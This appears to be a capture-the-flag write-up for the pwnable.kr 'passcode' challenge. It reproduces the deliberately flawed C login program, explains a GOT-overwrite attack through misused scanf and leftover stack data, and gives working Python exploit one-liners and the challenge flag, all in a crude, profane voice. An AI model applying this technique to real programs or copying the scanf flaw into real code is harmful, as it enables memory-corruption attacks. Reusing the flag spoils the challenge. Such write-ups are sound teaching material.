# Passcode

### Description
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
### passcode.c
```
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);
        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```
### Solution
The first and obvious approach is to execute passcode and input 338150 and 13371337 but it seems does not work:
![image](https://github.com/user-attachments/assets/4ad5ed61-c574-4870-a534-c3fec78269a1)

We can easily notice in the source code that instead of an address, it was the value there so the scanf malfunction. 
```
scanf("%d", passcode1);
```

Now, we gotta disassembly the code to look what we can do with it, the first thing to be checked out is the function welcome.

![image](https://github.com/user-attachments/assets/9d4918ea-5d73-475d-a28d-30f515993458)

It seems quite normal and there are nothing much to be exploited so we should move on to the function login:

![image](https://github.com/user-attachments/assets/87a3aec6-5842-4e43-999c-8e17c8554f68)

After a while messing with the code, i realized that the value passcode is stored at $ebp-10, if we can overwite this to be some kinds of address, it must be the solution to all this shit. But, how can we overwrite that shit, the solution is located in the function ``` welcome ```.

![image](https://github.com/user-attachments/assets/9ccce66d-1eaa-4dc2-96dc-4e185c7773e3)

Look at the stack frame of ``` welcome ``` and ``` login ``` we can see that the difference between the 2 top of stack are 96 byte so if we write 100 byte to the name, supprisingly we will have 4 bytes left even after the function ``` welcome ``` is no longer running, that is the default value of ``` passcode1 ```. To backup our theory, lets check this out:

![image](https://github.com/user-attachments/assets/4a0e9d95-3a8c-4d1d-90d1-7f89e7c990a1)

The result show that the theory was right, so the next thing is to do the same with ``` passcode2 ``` right? No, we don't have enough ``` scanf ``` to do such shit, we gotta do something different.

Because we can only use 1 ``` scanf ``` and overwrite 1 thing, i started thinking that this shit would be so cool if we can just jump directly to this line of code ``` system("/bin/cat flag"); ```. If we want to do that, we gotta overwrite a ```jump``` instruction, where can we find such thing? The answer that there are bunch of them in this code:

![image](https://github.com/user-attachments/assets/6dd39ec1-a8c5-4b7b-b121-3aa77a6228af)

We can use the ```jump``` inside those ```call``` instruction, we just have to choose `. So i choose the closest one which is ```fflush```, let's dissasembly it to see what inside it:

![image](https://github.com/user-attachments/assets/c72ebd85-b998-43b2-b51b-8e8c20cbfdbe)

The address ```0x804a004``` seems pretty nice cuz it does not contain any weird character so now we just have to write it to the stack and use the ```scanf``` to put the address of ```system("/bin/cat flag");``` on it.

![image](https://github.com/user-attachments/assets/96f79fa1-dbc3-4b92-bd92-eb6edfd773c2)

So i came up with this shitty python command:
```
python -c "print('h'*96+'\x01\xa0\x04\x08'+'\xea\x85\x04\x08')" | ./passcode
```
And the result:

![image](https://github.com/user-attachments/assets/5a59ca58-6493-4503-baa1-756dc1e0fa57)

Shit seems wrong because i directly put the byte in scanf so it will regconize those shit as some weird character not a fucking decimal and skip it so i gotta put that address as a decimal to solve this shit:

```
python -c "print('H'*96+'\x04\xa0\x04\x08'+'134514147')" | ./passcode
```

And the result:

![image](https://github.com/user-attachments/assets/8bc2181e-3c6e-4300-8632-3a9b226d644a)

And there we have it, the flag:
```
Sorry mom.. I got confused about scanf usage :(
```
